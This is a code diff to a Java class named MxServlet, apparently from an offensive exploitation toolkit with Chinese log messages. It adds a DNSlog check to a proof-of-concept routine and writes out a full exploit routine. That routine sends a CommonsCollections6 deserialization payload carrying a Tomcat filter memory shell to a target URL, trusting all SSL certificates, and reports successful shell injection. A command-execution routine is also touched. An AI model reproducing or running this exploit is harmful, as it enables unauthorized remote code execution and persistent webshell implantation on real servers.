@@ -55,6 +55,11 @@ public class MxServlet extends VulnBase {
 
     private void poc(String url) {
         try {
+            if (Config.DNSLOG == null) {
+                logMessage("[-] 请输入 dnslog 信息.");
+                return;
+            }
+
             URL apiUrl = new URL(url);
 
             // 设置全局http代理
@@ -88,7 +93,40 @@ public class MxServlet extends VulnBase {
     }
 
     private void exp(String url) {
+        try {
+            URL apiUrl = new URL(url);
 
+            // 设置全局http代理
+            HttpProxy.setProxy();
+
+            // 信任ssl证书
+            SSLUtil.trustAllCertificates();
+
+            byte[] postData = Util.getSerializedData(CommonsCollections6_Array.getObject("DefiningClassLoader", new String[]{ClassName.TomcatFilterMemshellFromThread, ClassCode.Tomcat7_FilterMemshellFromThread_JDK7}));
+
+            HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
+
+            // 设置超时
+            HttpUtil.setTimeout(urldns_conn);
+
+            // 设置请求头
+            urldns_conn.setRequestProperty("Content-Type", "application/octet-stream");
+            urldns_conn.setRequestProperty("Content-Length", String.valueOf(postData.length));
+
+            HttpUtil.post(urldns_conn, postData);
+
+            int responseCode = HttpUtil.getResponseCode(urldns_conn);
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
+                return;
+            } else {
+                logMessage("[-] MxServlet 反序列化利用失败, 状态码: " + responseCode);
+                return;
+            }
+        } catch (Exception e) {
+            logMessage("[-] MxServlet 反序列化利用失败, 请尝试手动利用. " + e);
+            return;
+        }
     }
 
     private void exec(String url) {
@@ -120,7 +158,7 @@ public class MxServlet extends VulnBase {
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
-                logExec("[+] 命令执行成功!\n" + responseText);
+                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 7));
                 return;
             } else {
                 logExec("[-] 命令执行失败. 请尝试手动利用.");
